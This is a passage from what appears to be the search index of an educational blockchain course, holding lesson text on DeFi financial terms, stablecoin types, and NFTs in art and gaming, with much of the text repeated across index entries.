finance: risk , which is the probability of losing money. Risk for a financial product can be affected by the type of asset, time an asset is held, liquidity for the asset, depreciation, volatility and more. From risk emerges the risk-return trade off that states the potential return rises with an increase in risk. Individuals use this to assess an investment and consider many factors, like their overall risk tolerance, the potential to replace lost funds, the investment's return in relation to other assets and more. In simple terms, the riskier the project, the greater the expected. A little more context can be found here . In the crypto industry and DeFi, one of the main sources of risk is due to volatility . Volatility is the unsteady spread of an asset's price movements around its average price. The greater the swings, the more volatile, the riskier the asset is perceived. Volatility can be measured in different ways. You can see volatility in action here . This volatility contributes to exchange rate risk , or the risk of devaluation of one currency compared to another. An example can be holding ETH compared to the US dollar, then ETH's price drops 15% in relation to the dollar. This problem is further compounded by holding two volatile currencies in relation to each other. Volatility emerges from various sources including market liquidity risk , or the lack of buyers and sellers. Liquidity is the ease in which you can buy or sell an asset. The less liquidity an asset has, the greater the volatility of an asset's price when buying or selling. Liquidity is the lifeblood of DeFi , since large amounts of liquidity also helps to create price stability. Illiquid assets have wilder price swings, making them less predictable, risker for network participants, and contributes to higher slippage . Slippage occurs when a trade settles for an average price that is different from what was requested. Think about a market of lots of buyers and sellers for an asset. A deep pool of buyers and sellers results in a narrow bid-ask spread , since you can find alternative takers if someone quotes a price that deviates from the crowd. In DeFi, slippage is most often seen when trading niche tokens with small networks or limited liquidity on decentralized exchanges, covered in a later section. To help reduce volatility and risk in DeFi, stablecoins were created. Stablecoins are fungible tokens that mimic a fiat currency\u2019s performance through a peg . Fungibility is the ability of a good or asset to be exchanged for another of the same kind, like exchanging two different dollars. A peg is a system by which one currency latches on to another to form a tight correlation. Stablecoins can maintain this peg in a variety of ways discussed in a later section. One method is through the use of collateralization and liquidation. DeFi protocols rely on collateral to allow for permissionless participation. Collateral is an asset a borrower pledges to a lender in case they cannot pay back a loan. In DeFi, collateral is in the form of crypto assets like ETH, other tokens with deep levels of liquidity. Even NFTs, which are non-fungible tokens issued to prove ownership of a unique digital asset, can be staked as collateral. Staking refers to depositing assets into an escrow contract thereby passing custody of the collateral to the protocol. Due to the volatility of crypto assets and the lack of decentralized credit systems, most DeFi protocols rely on the overcollateralization pattern to issue assets. This means requiring to cover over 100% of the loan. For example, say you wish to get $100 in one crypto asset. You will need $100 of collateral value in another asset. These assets are in sense collateralized loans and are the backbone of DeFi because they allow open, pseudo-anonymous finance , without credit scores or any sort of formal identity tied to a loan. Through overcollateralization, protocols can mitigate their risk, while providing access and possibilities for returns. This functioning is common in DeFi protocols and is explained here . The loan to collateral ratio expresses the degree to which a protocol is overcollateralized. The total value locked represents the amount of funds in a contract and is a proxy for contract's popularity. Due to volatility, the value of the collateral can drop below the value of the borrowed asset. When this occurs DeFi protocols typically begin to liquidate the users assets to maintain stability. Liquidation is the process of selling/distributing assets to settle debts. This is one of the ways a user can get rekt . Another is via rug pulls , where protocol developers run off with the assets, or DeFi hacks , where malicious actors exploit a bug in the contract code . Many protocol developers aim to achieve deep liquidity, broad usage and network effects . The ideal point culminates in a Schelling Point or a natural place of collaboration, brand awareness, and user evangelism. To achieve this, protocol developers rely on incentives to encourage and discourage certain types of behavior. One method to bootstrap the network is via liquidity mining programs. These programs can be seen as part of a marketing program to onboard users to engage with protocol. Users engage in yield farming to find the best APY by shifting capital across various places. There are various protocols like Yearn.Finance which help users automate strategies to maximize APY and the lowest cost through the use of vaults . There are some indicators that DeFi protocol Devs should know . Additional Resources DeFi and the Future of Finance by Campbell R. Harvey (Duke University), Ashwin Ramachandran (Dragonfly Capital) and Joey Santoro (Fei Protocol) page 1 - 12 DeFi Primitives Via Campbell Harvey - Duke University The Future of DeFi by Linda Xie The Network Effects Manual by nfx","title":"Key Terms"},{"location":"S05a-defi/M1-intro/L2-key-terms/#key-terms","text":"To understand decentralized finance, we must first understand some key terms in finance. Then we can look into the essential key terms that are unique to DeFi. As mentioned, finance can be defined as the \"study of systems of money, investments, and other financial instruments\". It can be seen as a societal tool to manage resources nominated in money, risk, and rewards across space and time between entities. DeFi upgrades this to occur on the \"internet of value\" via programmable blockchains like Ethereum with protocols written in smart contracts.","title":"Key Terms"},{"location":"S05a-defi/M1-intro/L2-key-terms/#economics-in-30-seconds","text":"A key foundation of finance is economics which deals with how people interact with value , specifically the production, distribution, and consumption of goods and services. Core to this idea is the concept of scarcity , or simply the gap between limited resources and unlimited wants. To solve this problem, we look towards allocating resources to the most productive uses. We use market-based systems based on property rights to allow individual entities to own and allocate resources to where they best see fit. From this arises supply and demand, another central idea in economics. In finance, scarcity, allocation and supply and demand translate into deploying limited amounts of capital across a range of possible investments. As we will see later, smart contract based systems make it easy to enforce and audit ownership, and what owners can do with their digital assets.","title":"Economics in 30 seconds"},{"location":"S05a-defi/M1-intro/L2-key-terms/#key-financial-terms-that-appear-in-defi","text":"Finance extends economics to the management of money and investments. Money has certain properties , some of which is the ability to quantify and transfer value. The most common example of money is fiat currency , a type of money a government has declared legal tender that allows for the settlement of private or public debts within a political jurisdiction. Examples of fiat currencies are the United States Dollar $, European Union's Euro \u20ac, The People's Republic of China's Renminbi RMB, Japanese Yen \u00a5, South African Rand R. Once we have money, we want to grow it. This is because inflation slowly eats away at the value of money. A dollar today is worth less than a dollar 20 years ago. So we must invest our money to keep up. In finance, that means investing in financial instruments defined as assets or bundles of capital represented by real or virtual documents. Not all opportunities or financial assets are equal. Out of this emerges a central idea in finance: risk , which is the probability of losing money. Risk for a financial product can be affected by the type of asset, time an asset is held, liquidity for the asset, depreciation, volatility and more. From risk emerges the risk-return trade off that states the potential return rises with an increase in risk. Individuals use this to assess an investment and consider many factors, like their overall risk tolerance, the potential to replace lost funds, the investment's return in relation to other assets and more. In simple terms, the riskier the project, the greater the expected. A little more context can be found here . In the crypto industry and DeFi, one of the main sources of risk is due to volatility . Volatility is the unsteady spread of an asset's price movements around its average price. The greater the swings, the more volatile, the riskier the asset is perceived. Volatility can be measured in different ways. You can see volatility in action here . This volatility contributes to exchange rate risk , or the risk of devaluation of one currency compared to another. An example can be holding ETH compared to the US dollar, then ETH's price drops 15% in relation to the dollar. This problem is further compounded by holding two volatile currencies in relation to each other. Volatility emerges from various sources including market liquidity risk , or the lack of buyers and sellers. Liquidity is the ease in which you can buy or sell an asset. The less liquidity an asset has, the greater the volatility of an asset's price when buying or selling. Liquidity is the lifeblood of DeFi , since large amounts of liquidity also helps to create price stability. Illiquid assets have wilder price swings, making them less predictable, risker for network participants, and contributes to higher slippage . Slippage occurs when a trade settles for an average price that is different from what was requested. Think about a market of lots of buyers and sellers for an asset. A deep pool of buyers and sellers results in a narrow bid-ask spread , since you can find alternative takers if someone quotes a price that deviates from the crowd. In DeFi, slippage is most often seen when trading niche tokens with small networks or limited liquidity on decentralized exchanges, covered in a later section. To help reduce volatility and risk in DeFi, stablecoins were created. Stablecoins are fungible tokens that mimic a fiat currency\u2019s performance through a peg . Fungibility is the ability of a good or asset to be exchanged for another of the same kind, like exchanging two different dollars. A peg is a system by which one currency latches on to another to form a tight correlation. Stablecoins can maintain this peg in a variety of ways discussed in a later section. One method is through the use of collateralization and liquidation. DeFi protocols rely on collateral to allow for permissionless participation. Collateral is an asset a borrower pledges to a lender in case they cannot pay back a loan. In DeFi, collateral is in the form of crypto assets like ETH, other tokens with deep levels of liquidity. Even NFTs, which are non-fungible tokens issued to prove ownership of a unique digital asset, can be staked as collateral. Staking refers to depositing assets into an escrow contract thereby passing custody of the collateral to the protocol. Due to the volatility of crypto assets and the lack of decentralized credit systems, most DeFi protocols rely on the overcollateralization pattern to issue assets. This means requiring to cover over 100% of the loan. For example, say you wish to get $100 in one crypto asset. You will need $100 of collateral value in another asset. These assets are in sense collateralized loans and are the backbone of DeFi because they allow open, pseudo-anonymous finance , without credit scores or any sort of formal identity tied to a loan. Through overcollateralization, protocols can mitigate their risk, while providing access and possibilities for returns. This functioning is common in DeFi protocols and is explained here . The loan to collateral ratio expresses the degree to which a protocol is overcollateralized. The total value locked represents the amount of funds in a contract and is a proxy for contract's popularity. Due to volatility, the value of the collateral can drop below the value of the borrowed asset. When this occurs DeFi protocols typically begin to liquidate the users assets to maintain stability. Liquidation is the process of selling/distributing assets to settle debts. This is one of the ways a user can get rekt . Another is via rug pulls , where protocol developers run off with the assets, or DeFi hacks , where malicious actors exploit a bug in the contract code . Many protocol developers aim to achieve deep liquidity, broad usage and network effects . The ideal point culminates in a Schelling Point or a natural place of collaboration, brand awareness, and user evangelism. To achieve this, protocol developers rely on incentives to encourage and discourage certain types of behavior. One method to bootstrap the network is via liquidity mining programs. These programs can be seen as part of a marketing program to onboard users to engage with protocol. Users engage in yield farming to find the best APY by shifting capital across various places. There are various protocols like Yearn.Finance which help users automate strategies to maximize APY and the lowest cost through the use of vaults . There are some indicators that DeFi protocol Devs should know .","title":"Key Financial Terms That Appear in DeFi"},{"location":"S05a-defi/M1-intro/L2-key-terms/#additional-resources","text":"DeFi and the Future of Finance by Campbell R. Harvey (Duke University), Ashwin Ramachandran (Dragonfly Capital) and Joey Santoro (Fei Protocol) page 1 - 12 DeFi Primitives Via Campbell Harvey - Duke University The Future of DeFi by Linda Xie The Network Effects Manual by nfx","title":"Additional Resources"},{"location":"S05a-defi/M2-stablecoins/L1/","text":"What are Stablecoins A critical issue in cryptocurrencies is extreme volatility, especially when compared to fiat currencies. It\u2019s hard to enter into any profitable financial agreement when prices can fluctuate wildly. Stablecoins were created to fix this issue. Stablecoins are cryptocurrencies built using smart contracts on programmatic blockchains, which significantly reduces or eliminates price volatility by aiming to peg to a fiat currency like the US dollar. This gives users a tool for managing risk and allowing them to engage with DeFi protocols reliably. Stablecoins are one of the cornerstones of the DeFi industry, as a user cannot reliably enter or exit a protocol without a stable currency. They also provide access to stable currencies to unbanked and underbanked people around the world , helping people to save, pay, invest and spend in more reliable ways. In addition, Stablecoins allows people to choose their economic policy based on their interests and objectives. There are five types of stablecoins, each collateralized by different assets and its own complexity/centralization profile. The types are ranked from most centralized/less complex to less centralized/more complex. Fiat backed Commodity backed Crypto backed Algorithmic Central Bank Digital Currencies* A good mental model for a Stablecoin is the paper money you have in your pocket. Think of it as a programmable IOU that everyone in your community would accept as payment. There are three things to consider when looking at stablecoins: Type of collateral Collateralization ratio Degree of centralization A general mental model could be that the simpler the stablecoin is to understand, the more centralized it is. The exception would be Central Bank Digital Currencies which could be complex, opaque, and highly centralized due to political issues. Fiat Backed Stablecoins These are backed by US dollars or a government currency in a bank account. These stablecoins are collateralized by US Dollars in bank accounts and are audited periodically to maintain their assurances. Examples include Tether\u2019s USDT and Circle\u2019s USDC . Fiat backed stablecoins are collateralized at 100% with dollars. In the case of Tether, it is collateralized with dollar and dollar equivalents (financial instruments that can be quickly turned to cash without losing much value). These are the simplest to understand since, from a technical perspective, the issuance is very simple. There is one dollar in a bank account for every token on the network. USDT and USDC are by far the most popular stablecoins for their ease of use. However, with this simplicity comes the centralization and the possibility of censorship. Both USDT and USDC can add users to blocklists and freeze their assets. Commodity backed Stablecoins Backed by gold or another asset. An example includes Paxos Gold . Every PAX Gold token is backed by an ounce of allocated gold. This type functions similar to fiat-backed stablecoins, including the ability for the issuer to place users on a blocklist. Furthermore, there is the additional complexity of the volatility of the price of gold which is higher than the fiat currencies. Crypto Collateralized Backed by crypto assets like ETH or other tokens as collateral. Due to the cryptocurrency\u2019s volatility, these assets need over 150% collateral (250% recommended) to deal with volatility. The prominent example is MakerDAO\u2019s DAI . Best known for introducing the Collateralized Debt Position (CDP) . There are many advantages to crypto collateralized stablecoins. Because the asset lives on-chain, the stablecoin can be audited by anyone at any time without permission . Furthermore, DAI is an actual money lego and can be built upon and easily integrated into any project. It can also generate interest. Along with transparency into its financial status, MakerDAO, the entity behind DAI, has a transparent governance system that allows the community members who hold MAKER tokens to vote on the management of the stablecoin. It\u2019s also a fully decentralized DAO , short for decentralized autonomous organization . Algorithmic Rebase Tokens Self-balancing through incentives and algorithms and non-collateralized. These use smart contract logic to expand and contract the supply of tokens to maintain their peg. Examples include AmpleForth\u2019s AMPL & Base Protocol's BASE . One can get a A Visual Explanation of Algorithmic Stablecoins by Haseeb Qureshi . Fractional Stablecoins Partially backed by collateral at 100% or less and partially stabilized algorithmically. The purpose is to improve capital efficiency. Examples include FRAX and Iron Finance\u2019s IRON . You can get a feeling for these via A Visual Explanation of FRAX by Haseeb Qureshi . Fractional stablecoins are a work in progress and have suffered from \u201crun on the bank\u201d , shakes the market\u2019s confidence. This causes a self-fulfilling prophecy of capital withdrawals at the same time. Like a game of musical chairs, someone will be left standing. Seigniorage Seigniorage typically involves at least two tokens. One representing the stable token. While the other attempts to stabilize the token through actively adjusting the stables supply. The volatility, either through profit or loss, is passed on to the other token(s). A few examples of Seigniorage Stablecoins are Empty Set Dollar, Basis, and Terra. Out of these, Terra is the only one who has maintained its peg. A typical, and often short-lived, mechanism employed is in the use of Seigniorage Shares . Often recognizable by the Stable Token and Bond Token. Central Bank Digital Currencies - CBDCs These are government-issued fiat currencies that utilize distributed ledger technology like Ethereum. As of 2021, China has begun to pilots for its Digital Yuan and five countries in the Caribbean have already launched them . There are also currently CBDC pilots in 14 countries including Sweden, South Korea and China. You can see up to date information on CBDC\u2019s via the Atlantic Council\u2019s CBDC tracker . There are some interesting DeFi primitives that make this technology possible. The first is the ERC-20 standard , which standardizes fungible tokens. Next, the possibility of escrow contracts allows for collateral to be deposited into a protocol, giving the protocol custody over those funds. Next, the ability to alter the supply is necessary. To expand the supply the protocol needs to mint tokens. To contract the supply, it needs to burn tokens. An interesting DeFi primitive that has evolved from algorithmic stablecoins is the concept of rebasing . The peg adjusts by expanding or contracting the supply of tokens depending on the price. For example, if the price goes up or down 10%, the supply will expand or contract 10%. Rebasing makes possible an elastic supply of tokens that change based on any condition, in this case, it being the market price.","title":"What are Stablecoins"},{"location":"S05a-defi/M2-stablecoins/L1/#what-are-stablecoins","text":"A critical issue in cryptocurrencies is extreme volatility, especially when compared to fiat currencies. It\u2019s hard to enter into any profitable financial agreement when prices can fluctuate wildly. Stablecoins were created to fix this issue. Stablecoins are cryptocurrencies built using smart contracts on programmatic blockchains, which significantly reduces or eliminates price volatility by aiming to peg to a fiat currency like the US dollar. This gives users a tool for managing risk and allowing them to engage with DeFi protocols reliably. Stablecoins are one of the cornerstones of the DeFi industry, as a user cannot reliably enter or exit a protocol without a stable currency. They also provide access to stable currencies to unbanked and underbanked people around the world , helping people to save, pay, invest and spend in more reliable ways. In addition, Stablecoins allows people to choose their economic policy based on their interests and objectives. There are five types of stablecoins, each collateralized by different assets and its own complexity/centralization profile. The types are ranked from most centralized/less complex to less centralized/more complex. Fiat backed Commodity backed Crypto backed Algorithmic Central Bank Digital Currencies* A good mental model for a Stablecoin is the paper money you have in your pocket. Think of it as a programmable IOU that everyone in your community would accept as payment. There are three things to consider when looking at stablecoins: Type of collateral Collateralization ratio Degree of centralization A general mental model could be that the simpler the stablecoin is to understand, the more centralized it is. The exception would be Central Bank Digital Currencies which could be complex, opaque, and highly centralized due to political issues.","title":"What are Stablecoins"},{"location":"S05a-defi/M2-stablecoins/L1/#fiat-backed-stablecoins","text":"These are backed by US dollars or a government currency in a bank account. These stablecoins are collateralized by US Dollars in bank accounts and are audited periodically to maintain their assurances. Examples include Tether\u2019s USDT and Circle\u2019s USDC . Fiat backed stablecoins are collateralized at 100% with dollars. In the case of Tether, it is collateralized with dollar and dollar equivalents (financial instruments that can be quickly turned to cash without losing much value). These are the simplest to understand since, from a technical perspective, the issuance is very simple. There is one dollar in a bank account for every token on the network. USDT and USDC are by far the most popular stablecoins for their ease of use. However, with this simplicity comes the centralization and the possibility of censorship. Both USDT and USDC can add users to blocklists and freeze their assets.","title":"Fiat Backed Stablecoins"},{"location":"S05a-defi/M2-stablecoins/L1/#commodity-backed-stablecoins","text":"Backed by gold or another asset. An example includes Paxos Gold . Every PAX Gold token is backed by an ounce of allocated gold. This type functions similar to fiat-backed stablecoins, including the ability for the issuer to place users on a blocklist. Furthermore, there is the additional complexity of the volatility of the price of gold which is higher than the fiat currencies.","title":"Commodity backed Stablecoins"},{"location":"S05a-defi/M2-stablecoins/L1/#crypto-collateralized","text":"Backed by crypto assets like ETH or other tokens as collateral. Due to the cryptocurrency\u2019s volatility, these assets need over 150% collateral (250% recommended) to deal with volatility. The prominent example is MakerDAO\u2019s DAI . Best known for introducing the Collateralized Debt Position (CDP) . There are many advantages to crypto collateralized stablecoins. Because the asset lives on-chain, the stablecoin can be audited by anyone at any time without permission . Furthermore, DAI is an actual money lego and can be built upon and easily integrated into any project. It can also generate interest. Along with transparency into its financial status, MakerDAO, the entity behind DAI, has a transparent governance system that allows the community members who hold MAKER tokens to vote on the management of the stablecoin. It\u2019s also a fully decentralized DAO , short for decentralized autonomous organization .","title":"Crypto Collateralized"},{"location":"S05a-defi/M2-stablecoins/L1/#algorithmic","text":"","title":"Algorithmic"},{"location":"S05a-defi/M2-stablecoins/L1/#rebase-tokens","text":"Self-balancing through incentives and algorithms and non-collateralized. These use smart contract logic to expand and contract the supply of tokens to maintain their peg. Examples include AmpleForth\u2019s AMPL & Base Protocol's BASE . One can get a A Visual Explanation of Algorithmic Stablecoins by Haseeb Qureshi .","title":"Rebase Tokens"},{"location":"S05a-defi/M2-stablecoins/L1/#fractional-stablecoins","text":"Partially backed by collateral at 100% or less and partially stabilized algorithmically. The purpose is to improve capital efficiency. Examples include FRAX and Iron Finance\u2019s IRON . You can get a feeling for these via A Visual Explanation of FRAX by Haseeb Qureshi . Fractional stablecoins are a work in progress and have suffered from \u201crun on the bank\u201d , shakes the market\u2019s confidence. This causes a self-fulfilling prophecy of capital withdrawals at the same time. Like a game of musical chairs, someone will be left standing.","title":"Fractional Stablecoins"},{"location":"S05a-defi/M2-stablecoins/L1/#seigniorage","text":"Seigniorage typically involves at least two tokens. One representing the stable token. While the other attempts to stabilize the token through actively adjusting the stables supply. The volatility, either through profit or loss, is passed on to the other token(s). A few examples of Seigniorage Stablecoins are Empty Set Dollar, Basis, and Terra. Out of these, Terra is the only one who has maintained its peg. A typical, and often short-lived, mechanism employed is in the use of Seigniorage Shares . Often recognizable by the Stable Token and Bond Token.","title":"Seigniorage"},{"location":"S05a-defi/M2-stablecoins/L1/#central-bank-digital-currencies-cbdcs","text":"These are government-issued fiat currencies that utilize distributed ledger technology like Ethereum. As of 2021, China has begun to pilots for its Digital Yuan and five countries in the Caribbean have already launched them . There are also currently CBDC pilots in 14 countries including Sweden, South Korea and China. You can see up to date information on CBDC\u2019s via the Atlantic Council\u2019s CBDC tracker . There are some interesting DeFi primitives that make this technology possible. The first is the ERC-20 standard , which standardizes fungible tokens. Next, the possibility of escrow contracts allows for collateral to be deposited into a protocol, giving the protocol custody over those funds. Next, the ability to alter the supply is necessary. To expand the supply the protocol needs to mint tokens. To contract the supply, it needs to burn tokens. An interesting DeFi primitive that has evolved from algorithmic stablecoins is the concept of rebasing . The peg adjusts by expanding or contracting the supply of tokens depending on the price. For example, if the price goes up or down 10%, the supply will expand or contract 10%. Rebasing makes possible an elastic supply of tokens that change based on any condition, in this case, it being the market price.","title":"Central Bank Digital Currencies - CBDCs"},{"location":"S05a-defi/M3-nfts/L1/","text":"NFTs: More than Solidity Code What are NFTs An engineer walks into a meetup. How do we explain the significance of NFTs? Why are NFTs useful? Let's explain! Non-fungible tokens or NFTs are more than just code. NFTs are smart contract representations of unique and non-fungible items. Fungibility is characterized by goods being uniform in their properties, interchangeable, and indistinguishable from each other. Examples of fungibility include US Dollars or Coca-Cola bottles. NFTs can represent ownership of digital scarce goods like art , collectables or any unique non-fungible item. They can also represent unique trading positions on a bonding curve like Uniswap v3 , intellectual property , licenses , insurance , options, bonds, real estate, game items , deeds, domain names and more. Even when considering two identical collectables, other factors can make them unique, like their provenance , history, year of production and more. NFTs are created with the ERC-721 standard. Popularized by CryptoKitties in 2017, they share these properties: Unique, with their particular qualities usually stored in the metadata Indivisible since they cannot be split up. Provably scarce. Usually, one or a limited number of NFTS and can be verified on-chain Provable ownership, since you check on-chain Fraud proof. They can't be faked. We will cover some issues around this later. Easily transferable ERC-1155 further builds upon ERC-721 and allows for mixed-use of fungible and non-fungible tokens, among other features . You can explore the difference between 721 and 1155 here . You can also see the difference between all three standards and their use cases . ERC-1155 was created by Enjin and can be used in gaming, so non-fungible items like a player or item can hold fungible assets like gold or coins. We will see later on how this is applicable. NFT Hype via Art Maybe you have heard of Crypto Punks , Disaster Girl NFT , Beeple\u2019s 69 million dollar NFT , Damien Hirst\u2019s NFTs , Bored Yacht Club , RarePizzas , Pudgy Penguins , EulerBeats and pplpleasr ? Even Edward Snowden and others have found a new market for their art. Haven\u2019t heard of them? You can get hip to it on CryptoTwitter , sign up for Bankless\u2019s MetaVersal newsletter or use Non-fungible.com for real time digital asset tracking to help you to navigate NFT markets. What's the deal with the hype? Why is this so important? First, you may want to learn the quick History of NFTs via Potion . Then, two highly recommended videos on NFTs that can explain more are The Defiant Guide to Digital Art and NFTs and The Greatest NFT Film Ever Made by The Defiant . The most prolific and accessible usage of NFTs is art and gaming. What is art? According to Andy Warhol, \"Art is what you can get away with\". The message can be the medium as Andy Wahorl proved by using mass production and consumerism in his art . How are they a better way than just releasing art on the internet? Why NFTS Telephone problem: Provenance Ethereum also solves the \"telephone problem\", where information is changed over time. Since Ethereum has an immutable ledger, one could track changes to historical digital artefacts over time. Most importantly, it can track provenance for items, whether cultural or utilitarian, like olive oil. This is important because Ethereum can be used as a store of historical value, like culture. Zero costs, zero pricing The internet of information allowed anyone to disseminate culture. Easy copying means that due to the near-zero cost of replicating information, the value of any art that could be digitized is reduced close to zero. Additionally, any value accrued was captured by the middlemen who controlled the servers and could set the market rules. Even with strong branding and engagement, the middlemen can extract large amounts of value, as we will see in the following section. Power through markets The properties of Ethereum change this. The commoditization of network servers and databases through a single world computer allows the artist to move between providers. Enforced digital scarcity limits authentic copies and enforces legitimacy and social signalling. Programmable smart contracts enable creators to set the rules of the game for their art and capture value how they see fit. In theory, this means being paid every time the art changes owners, not just on the first sale. It also means that the art can carry its own set of tokenomics, creating hype via price action. Ownership means that the asset can be used as collateral, rented, or licensed in a digitally enforced manner. These are unique only to blockchain-based networks. With EIP-2981- The Royalty Standard , creators can enable universal support for royalty payments across all NFT marketplaces and ecosystem participants. This solves the problem of being tied to any NFT marketplace, which we will discuss later. In addition, creators can leverage EIP-2615 - The Non-Fungible Token with mortgage and rental functions to turn their NFTs into streams of income. These EIPs can be helpful in art markets as well as gaming economies, as we shall see. There are various ways users and artists can make money off NFTs . Services like reNFT allow users to rent their NFTs. NFTfi enables users to use them as collateral. This solves the issue of using assets with potentially illiquid markets for collateralized loans. Don't know what NFT to buy or don't have enough cash to buy a whole one? NFTx allows users to mint and buy into decentralized NFT index funds that fractionalize NFTs into ERC-20 tokens. Platforms like Rariable and Unicly even engage in a liquidity mining program to incentivize users to buy and sell NFTs in exchange for tokens. These can be used for governance or sold on open markets. Ethereum can help decentralize art markets and games, giving artists and users/collectors a more direct connection, reducing dominant brokers' cartel-like behaviour. It also unites fragmented markets by placing them on the internet and helping to bring a new crowd to Ethereum . In the process, users begin to understand decentralization and are exposed to DeFi-like mechanics. Myths: Legitimacy and Coordination Why is disseminating culture important? Myths are all around us. They inform and are part of the substrate of our belief and value systems. Pragmatically speaking, it's why people attach value to Yeezys or Balenciaga. Or why they choose Harvard over their local state college. It's why Jordans have a better cultural cache than Shaqs. According to Yoval Noah Harari in his book Sapiens , myths are social fiction that allows humans to scale collaboration from small tribes to millions of people. Legitimacy is what separates the in-group from the outgroup. It keeps the imposters who wish to mimic and gain a group's benefits without the costs. Legitimacy underpins social signalling, which allows for coordination between groups . We find social signalling in economics and evolutionary biology . On a practical level, NFTs make it easier to call out posers. Or as they say, \"You gotta pay the cost to be da boss\". Being provable scarce allows for legitimacy to be enforced. However, this is not to say that the technology is perfect. There are some issues with using NFTs to prove outright authenticity, as fraudsters try to impersonate others and reupload their works . Myths > values > choice > signalling > legitimacy > coordination. @punk6929 in this tweet thread \ud83e\uddf5 beautifully sums up the role of NFTs in creating culture, myths and scaling human collaboration. Myth Building, or \"branding and marketing\", allows companies to place a logo on an item and charge the idea. It allows celebrities to earn hefty sums of money for a brand's association with them. Myths underpin even cryptocurrencies if we take a look at Bitcoin or Dogecoin. Myths inform branding, which informs a user's choices based on their values. Creators can be artists or scientists. NFTs can even give control to creators of scientific intellectual property . Ultimately, NFTs give the economics and control of these myths to their creators \ud83d\udcaa. They can be used in conjunction with DAO to create art to fund causes like how Rare Pizzas uses NFTs to fund free pizza for people on Bitcoin Pizza Day . Or FlamingoDAO to fund NFTs . How to get NFTs There are various places where you buy or sell NFTs. Check out the links for guides on leading platforms OpenSea , Foundation , Rarible , Zora , SuperRare , Mintable , or Palm NFT Sidechain . Get a deep dive into the status of the industry here . As convenient as these platforms are, there are issues with them . Some of these issues relate to centralization risk, which increases censorship or your assets being deleted. Some platforms control your keys, which means you don't really own the NFT. There is a lack of data portability fragments markets and limits royalties between platforms. Finally, there is a centralization risk with any data which underpins the NFT could also be stored on a centralized server. In the next part, we will see how to create an NFT and leverage tools to decentralize your assets. Creating NFTs You can create your own NFTs! Learn how to create your own NFT via Ethereum.org . Furthermore, you can host them on a decentralized file storage solution like NFT.storage . It\u2019s powered by IPFS and Filecoin . To set up, go through the nft.storage instructions. Want to learn more? Go to nftschool.dev to learn about best practices. Feel free to check out the Filecoin Truffle Box and these set up instructions . But what about art? You can use Adobe Photoshop or open-source tools like GIMP image editor or Blender for 3D creation. Pro tip: you can check out the Decentraland Discord and ask what tools developers use to build things. Want to go the programmatic route to create NFTs like this generative art example or this example ? Generative Art let's the code create the art. Use P5.js , the JavaScript library, for creating coding. It focuses on making coding accessible for artists, designers, beginners and anyone else! See a great example of generative art here . Dan Shiffman , the creator of The Coding Train , has the most comprehensive videos on how to use P5.js on the internet . He also has some of the best and most ENTERTAINING videos on learning to code. In addition, he wrote a fantastic book called The Nature of Code , which shows you how to model nature with JavaScript. The book has a video series you can follow along. If you can support his channel, please donate to support his work \u2665\ufe0f. You can combine P5.js with physics libraries like Matter.js or PhysicsJS. For a 3D library, you can try out ThreeJS. You can check out this tutorial to see how to create generative art using P5.js and React, mint an NFT and host it on your website . Also, check out BeyondNFT to learn how to build interactive NFTs with p5JS and ThreeJS . How about using TensorFlowJS to get user input and try to figure out how to get interactions with your NFTs. Maybe, they can \"learn\" from their users and record some version of that data on-chain \ud83e\udd37\u200d\u2642\ufe0f. You can also explore how to add royalties for various platform secondary sales with this tutorial . What if you can go beyond NFTs and create in-game assets that can make money? The MetaVerse: Gaming and NFTs Fun fact: the genesis of Ethereum sort of started with games. Vitalik Buterin discovered the evils of centralized entities after losing his World of Warcraft assets . The first NFTs were created by a blockchain-based game called CryptoKitties . Enjin created the ERC1155 standard for gaming applications. Turns out, NFTs are a crucial building block to the metaverse and in-game economies. AXIE Infinity is proving to be the killer app of Gaming and NFTs , with more revenue than Uniswap and even Ethereum itself . Gaming is the best place due to feedback loops and the utility of the NFT. In-game items can be represented as NFTs. A game's feedback loop keeps the users engaged and can give added value to the NFTs. Straight out of the book Ready Player One , play-to-earn is an emerging phenomenon where people playing games are earning more than the average income in some developing nations . Massively multiplayer online role-playing games like Everquest , World of Warcraft , EVE Online , have already had internal game economies for years. Fortnite and Roblox make massive amounts of money. These game economies can yield interesting data . However, centralization plagues the game creators and players themselves. Game developers can act as central banks and skew imperfect \"markets\". Game developers themselves have to fork over tons of money to app stores. Worst of all, markets don't exist since players can't trade with each other. Blockchains are the new app stores Fortnite, Roblox, and other games have to pay massive fees to centralized app store providers for all the money they make. Roblox pays 24% of all money generated to App Stores. Fortnite famously sued Google and Apple for the large cut they took . See Chiris Dixon's thread \ud83e\uddf5 Blockchain-based games can solve a lot of market-based problems caused by centralized games for users and games. Costly fees could be avoided. Better player-led internal economies where users own their assets forever and freely trade with each other. Games and assets can be transferred between platforms. Third-party developers won't have to worry about changing in-game economics. DeFi within Gaming economies Games like AXIE Infinity , Decentraland ,and Gods Unchained build actual in-game economies where players can trade. Decentralized App stores like MetaZone are emerging where users can create assets for open-world games. By using DeFi patterns like AMMs, lending markets, index funds, using assets as collateral, users can help manage their economies. Emerging standards around rental, royalty will expand the ways users can play games to earn money. That way, the rewards of this cultural product can go to the creators and players, not just the game companies. These in-game economies grow because of the demand for scarce assets. Internal economies can use the existing DeFi patterns we have seen to help this. However, different games will have fragmented liquidity and assets since they would conceivably use their own custom EVM compatible chain. Using cross-chain lending markets and yield farming for in-game assets sounds familiar to cross-chain yield farming or lending markets in DeFi. Projects like Yield Guild are looking to help fix this issue. Worst case scenario, all these assets can convert to ETH, and we would see network effects between games and other ecosystems. We have already seen tokenized real estate in games like Decentraland. Out of this is emerging rental agreements , which could eventually be applied in other scenarios. Rental income can allow for usage of NFT to earn a yield and split the income to the originator. Say if one rents a plot of land on a digital game like Decentraland, and an NFT represents that plot. Lending markets would allow players to rent assets and share the profits, or XP points can be another application. You can even buy ad space within Decentraland . Over time, it will be easy to see how game guilds could transform into DAO managing, trading, collaborating, and competing over resources. This sounds a lot like modern companies. And it all happened with memes and magical internet money. Additional Resources NFT School via nftschool.dev The History of NFTs via Potion The Defiant Guide to Digital Art and NFTs The Greatest NFT Film Ever Made by The Defiant Mark Cuban on Digital Collectables via The Defaint The Most Important Scarce Resource is Legitimacy by Vitalik Buterin Legitimacy | Vitalik Buterin via Bankless","title":"NFTs: More than Solidity Code"},{"location":"S05a-defi/M3-nfts/L1/#nfts-more-than-solidity-code","text":"","title":"NFTs: More than Solidity Code"},{"location":"S05a-defi/M3-nfts/L1/#what-are-nfts","text":"An engineer walks into a meetup. How do we explain the significance of NFTs? Why are NFTs useful? Let's explain! Non-fungible tokens or NFTs are more than just code. NFTs are smart contract representations of unique and non-fungible items. Fungibility is 